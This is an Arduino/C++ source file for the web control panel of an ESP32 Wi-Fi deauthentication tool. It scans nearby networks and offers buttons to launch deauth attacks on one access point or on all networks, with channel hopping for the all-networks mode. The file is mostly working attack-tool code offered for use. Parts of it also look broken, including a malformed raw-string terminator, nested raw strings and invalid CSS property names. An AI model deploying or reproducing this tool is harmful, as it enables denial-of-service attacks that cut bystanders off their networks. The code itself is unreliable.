// Source File: web_interface.cpp

#include "web_interface.h"
#include "deauth_core.h" // Needed to call start_deauth and stop_deauth
#include "definitions.h" // Needed for DEAUTH_TYPE_ macros and AP_SSID/PASS
#include "wifi_manager.h" // Needed for wifi_perform_scan and getEncryptionType

// External declarations for variables defined in the main .ino
extern WebServer server; // The web server instance
extern int num_networks; // Stores the number of scanned networks
extern int eliminated_stations; // Counter for single mode deauth


// --- Function Definitions ---

void start_web_interface() {
    DEBUG_PRINTF("Starting HTTP server...\n");

    // Note: WiFi initialization (AP mode) should be done in setup()
    // If you switch modes in start_deauth, stop_deauth MUST switch back to AP
    // before calling server.begin() again.

    // Perform an initial scan when starting the web interface
    wifi_perform_scan(); // Use the wifi_manager function

    // Define the request handlers for the web server URLs and HTTP methods
    server.on("/", handle_root);
    server.on("/deauth", HTTP_POST, handle_deauth);
    server.on("/deauth_all", HTTP_POST, handle_deauth_all);
    server.on("/rescan", HTTP_POST, handle_rescan);
    server.on("/stop", HTTP_POST, handle_stop);

    server.begin(); // Start the HTTP server
    DEBUG_PRINTF("HTTP server started\n");
}

void web_interface_handle_client() {
    server.handleClient(); // Process incoming web client requests
}

// Helper function to redirect HTTP client to the root page
void redirect_root() {
  server.sendHeader("Location", "/");
  server.send(301); // 301 Moved Permanently is common for redirects
}


// Handler for the root URL ("/") - serves the main HTML page
void handle_root() {
  // Ensure networks are scanned if num_networks is not set or zero
  if (num_networks <= 0) {
      wifi_perform_scan(); // Use the wifi_manager function
  }

  // Start building the HTML response string
  String html = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP32-Deauther</title>
    <style>
        body { font-family: 'Arial', sans-serif; line-height: 1.6; color: #e0e0e0; max-width: 800px; margin: 20px auto; padding: 0 20px; background: linear-gradient(135deg, #1a1a1a 0%, #333333 70%, #550000 100%); min-height: 100vh; box-sizing: border-box; }
        *, *:before, *:after { box-sizing: inherit; }
        h1, h2 { color: #e57373; text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); text-align: center; margin-bottom: 20px; margin-top: 30px; }
        h1 { margin-top: 0; }
        .container { background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4); margin-bottom: 30px; color: #333; overflow: hidden; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; table-layout: auto; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #eee; word-break: break-word; }
        th { background-color: #550000; color: white; font-weight: bold; }
        tr:nth-child(even) { background-color: #f9f9f9; }
        tr:hover { background-color: #e0e0e0; }
        .table-container { overflow-x: auto; }
        form { margin-bottom: 0; }
        input[type="text"], input[type="submit"] { display: block; width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 1rem; }
        input[type="submit"] { background: linear-gradient(90deg, #e57373 0%, #d32f2f 100%); color: white; border: none; cursor: pointer; transition: background-color 0.3s ease, box-shadow 0.3s ease; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); font-size: 1.1rem; font-weight: bold; border-radius: 5px; }
        input[type="submit"]:hover { background: linear-gradient(90deg, #d32f2f 0%, #e57373 100%); box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3); }
        form[action="/stop"] input[type="submit"] { background: linear-gradient(90deg, #666 0%, #333 100%); box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); margin-top: 10px; }
        form[action="/stop"] input[type="submit"]:hover { background: linear-gradient(90deg, #333 0%, #666 100%); box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3); }
        .alert { background-color: #4CAF50; color: white; padding: 20px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4); text-align: center; margin-bottom: 20px; }
        .alert.error { background-color: #f44336; }
        .button { display: inline-block; padding: 10px 20px; margin-top: 20px; background: linear-gradient(90deg, #008CBA 0%, #005f73 100%); color: white; text-decoration: none; border-radius: 5px; transition: background-color 0.3s ease, box-shadow 0.3s ease; box_shadow: 0 4px 8px rgba(0, 0, 0, 0.2); font_size: 1em; }
        .button:hover { background: linear-gradient(90deg, #005f73 0%, #008CBA 100%); box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3); }
        .reason-codes-table { margin-top: 20px; }
        .reason-codes-table th { background-color: #333; color: white; }
        .reason-codes-table tr:nth-child(even) { background-color: #f2f2f2; }
        .reason-codes-table tr:hover { background-color: #e0e0e0; }
        .reason-codes-table td:first-child { font-weight: bold; }
        @media (max-width: 600px) { body { padding: 0 10px; } .container { padding: 15px; } th, td { padding: 8px; } input[type="text"], input[type="submit"] { padding: 10px; margin-bottom: 10px; } }
    </style>
</head>
<body>
    <h1>ESP32-Deauther</h1>

    <h2>WiFi Networks</h2>
    <div class="container">
        <div class="table-container">
            <table>
                <tr>
                    <th>#</th>
                    <th>SSID</th>
                    <th>BSSID</th>
                    <th>Chan</th>
                    <th>RSSI</th>
                    <th>Encrypt</th>
                </tr>
)=====";

  // Add network scan results to the HTML table
  for (int i = 0; i < num_networks; i++) {
    String encryption = getEncryptionType(WiFi.encryptionType(i)); // Use wifi_manager function
    html += "<tr><td>" + String(i) + "</td><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td>" +
            String(WiFi.channel(i)) + "</td><td>" + String(WiFi.RSSI(i)) + "</td><td>" + encryption + "</td></tr>";
  }

  // Continue HTML string with forms and reason codes
  html += R"=====(
            </table>
        </div>
    </div>

    <div class="container">
        <form method="post" action="/rescan">
            <input type="submit" value="Rescan Networks">
        </form>
    </div>

    <div class="container">
        <h2>Launch Deauth Attack (Single AP)</h2>
        <form method="post" action="/deauth">
            <input type="text" name="net_num" placeholder="Network Number (e.g., 0)" required>
            <input type="text" name="reason" placeholder="Reason code (e.g., 1)" value="1" required>
            <input type="submit" value="Launch Attack">
        </form>
         <p>Eliminated stations (in single mode): )" + String(eliminated_stations) + R"(</p>
    </div>

    <div class="container">
        <h2>Launch Deauth Attack (All Networks)</h2>
        <form method="post" action="/deauth_all">
            <input type="text" name="reason" placeholder="Reason code (e.g., 1)" value="1" required>
            <input type="submit" value="Deauth All">
        </form>
        <p>Note: Deauth All mode disables the web interface.</p>
    </div>

    <div class="container">
        <form method="post" action="/stop">
            <input type="submit" value="Stop Deauth Attack">
        </form>
         <p>Note: Stopping the attack re-enables the web interface.</p>
    </div>


    <div class="container reason-codes-table">
        <h2>Reason Codes</h2>
            <table>
                <tr>
                    <th>Code</th>
                    <th>Meaning</th>
                </tr>
                <tr><td>0</td><td>Reserved.</td></tr>
                <tr><td>1</td><td>Unspecified reason.</td></tr>
                <tr><td>2</td><td>Previous authentication no longer valid.</td></tr>
                <tr><td>3</td><td>Deauthenticated because sending station (STA) is leaving or has left Independent Basic Service Set (IBSS) or ESS.</td></tr>
                <tr><td>4</td><td>Disassociated due to inactivity.</td></tr>
                <tr><td>5</td><td>Disassociated because WAP device is unable to handle all currently associated STAs.</td></tr>
                <tr><td>6</td><td>Class 2 frame received from nonauthenticated STA.</td></tr>
                <tr><td>7</td><td>Class 3 frame received from nonassociated STA.</td></tr>
                <tr><td>8</td><td>Disassociated because sending STA is leaving or has left Basic Service Set (BSS).</td></tr>
                <tr><td>9</td><td>STA requesting (re)association is not authenticated with responding STA.</td></tr>
                <tr><td>10</td><td>Disassociated because the information in the Power Capability element is unacceptable.</td></tr>
                <tr><td>11</td><td>Disassociated because the information in the Supported Channels element is unacceptable.</td></tr>
                <tr><td>12</td><td>Disassociated due to BSS Transition Management.</td></tr>
                <tr><td>13</td><td>Invalid element, that is, an element defined in this standard for which the content does not meet the specifications in Clause 8.</td></tr>
                <tr><td>14</td><td>Message integrity code (MIC) failure.</td></tr>
                <tr><td>15</td><td>4-Way Handshake timeout.</td></tr>
                <tr><td>16</td><td>Group Key Handshake timeout.</td></tr>
                <tr><td>17</td><td>Element in 4-Way Handshake different from (Re)Association Request/ Probe Response/Beacon frame.</td></tr>
                <tr><td>18</td><td>Invalid group cipher.</td></tr>
                <tr><td>19</td><td>Invalid pairwise cipher.</td></tr>
                <tr><td>20</td><td>Invalid AKMP.</td></tr>
                <tr><td>21</td><td>Unsupported RSNE version.</td></tr>
                <tr><td>22</td><td>Invalid RSNE capabilities.</td></tr>
                <tr><td>23</td><td>IEEE 802.1X authentication failed.</td></tr>
                <tr><td>24</td><td>Cipher suite rejected because of the security policy.</td></tr>
            </table>
    </div>

</body>
</html>
)=====";

  server.send(200, "text/html", html);
}

// Handler for launching a single AP deauth attack
void handle_deauth() {
  int wifi_number = server.arg("net_num").toInt();
  uint16_t reason = server.arg("reason").toInt();

  String html = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deauth Attack Status</title>
    <style>
        body { font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #1a1a1a 0%, #333333 70%, #550000 100%); color: #333; }
        .alert { background-color: #4CAF50; color: white; padding: 30px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.4); text-align: center; max-width: 400px; width: 90%; }
        .alert.error { background-color: #f44336; }
        .alert h2 { color: white; text-shadow: none; margin-top: 0; margin-bottom: 15px; }
        .alert p { margin_bottom: 0; font_size: 1.1em; }
        .button { display: inline-block; padding: 10px 20px; margin-top: 30px; background: linear-gradient(90deg, #008CBA 0%, #005f73 100%); color: white; text-decoration: none; border-radius: 5px; transition: background_color 0.3s ease, box_shadow 0.3s ease; box_shadow: 0 4px 8px rgba(0, 0, 0, 0.2); font_size: 1em; }
        .button:hover { background: linear-gradient(90deg, #005f73 0%, #008CBA 100%); box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3); }
    </style>
</head>
<body>
    <div class="alert)=====";

  // Check if the selected network number is valid based on the last scan
  // Note: Assumes num_networks is reasonably up-to-date from the last root page load or rescan.
  if (wifi_number >= 0 && wifi_number < num_networks) {
    html += R"=====( ">
        <h2>Starting Deauth Attack!</h2>
        <p>Deauthenticating network number: )" + String(wifi_number) + R"(</p>
        <p>Reason code: )" + String(reason) + R"(</p>
        <a href="/" class="button">Back to Home</a>
    </div>)=====";
    start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason); // Call deauth_core function
  } else {
    html += R"=====( error">
        <h2>Error: Invalid Network Number</h2>
        <p>Please select a valid network number from the list.</p>
        <a href="/" class="button">Back to Home</a>
    </div>)=====(;
  }

  html += R"=====(
</body>
</html>
  )=====";

  server.send(200, "text/html", html);
}

// Handler for launching "deauth all" attack
void handle_deauth_all() {
  uint16_t reason = server.arg("reason").toInt();

  String html = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deauth All Networks Status</title>
    <style>
        body { font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #1a1a1a 0%, #333333 70%, #550000 100%); color: #333; }
        .alert { background-color: #ff9800; color: white; padding: 30px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.4); text-align: center; max-width: 450px; width: 90%; }
        .alert h2 { color: white; text-shadow: none; margin-top: 0; margin-bottom: 15px; }
        .alert p { margin_bottom: 0; font_size: 1.1em; }
    </style>
</head>
<body>
    <div class="alert">
        <h2>Starting Deauth Attack on All Networks!</h2>
        <p>WiFi will shut down now.</p>
        <p>To stop the attack, please reset the ESP32.</p>
        <p>Reason code: )" + String(reason) + R"(</p>
    </div>
</body>
</html>
  )=====";

  server.send(200, "text/html", html);
  delay(100); // Small delay to ensure response is sent before stopping server

  server.stop(); // Stop the web server before starting the "all" attack
  start_deauth(0, DEAUTH_TYPE_ALL, reason); // Call deauth_core function (wifi_number 0 is ignored in DEAUTH_TYPE_ALL)
}

// Handler for rescanning networks
void handle_rescan() {
  wifi_perform_scan(); // Use wifi_manager function
  redirect_root(); // Redirect back to the main page to show results
}

// Handler for stopping the deauth attack
void handle_stop() {
  stop_deauth(); // Call deauth_core function
  // IMPORTANT: If server.stop() was called in handle_deauth_all, you might need
  // to restart the web server here to access the UI again. Add server.begin();
  // if needed, but consider the Wi-Fi mode implications.
  server.begin(); // Attempt to restart the web server
  redirect_root(); // Redirect back to the main page
}

// --- Standard Arduino Functions ---

void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200); // Initialize serial communication for debugging
  Serial.println("ESP32-Deauther Starting...");
#endif

#ifdef LED
  pinMode(LED, OUTPUT); // Initialize LED pin as output (LED define from definitions.h)
  // Optional: Blink LED once on startup (requires blink_led function and defines)
  // blink_led(1, 500);
#endif

  // --- Wi-Fi Initialization ---
  // Start the SoftAP for the web interface
  wifi_init_ap(); // Use wifi_manager function

  // Start the web interface - this will also perform an initial scan
  start_web_interface(); // Call web_interface function
}

void loop() {
  // The loop manages different modes of operation (channel hopping for deauth all, or web server handling)
  if (deauth_type == DEAUTH_TYPE_ALL) {
    // If in "deauth all" mode, cycle through Wi-Fi channels
    if (curr_channel > CHANNEL_MAX) curr_channel = 1; // Reset channel if max is reached (CHANNEL_MAX from definitions.h)
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE); // Set the Wi-Fi channel
    curr_channel++; // Move to the next channel
    delay(10); // Small delay to yield control and prevent watchdog timeouts
    // Note: While in DEAUTH_TYPE_ALL, the web server handlers are NOT called in this loop structure.
    // The web server is also stopped in handle_deauth_all.
    // To stop this mode, a hardware reset is likely required unless a timer or
    // other background mechanism is used to check for a stop condition.
  } else {
    // If not in "deauth all" mode (e.g., idle or DEAUTH_TYPE_SINGLE),
    // handle incoming web client requests.
    web_interface_handle_client(); // Call web_interface function
    // Note: The sniffer function (when enabled by start_deauth) runs in the background
    // regardless of what is happening in the loop, as long as promiscuous mode is on.
    // The frequency of sniffer calls is handled by the ESP-IDF Wi-Fi driver.
  }

  // Add a small delay here if the loop finishes very quickly, to prevent watchdog timeouts.
  // A delay of 1ms is often sufficient if there's no other blocking code.
  // delay(1); // Optional: Add a small delay
}
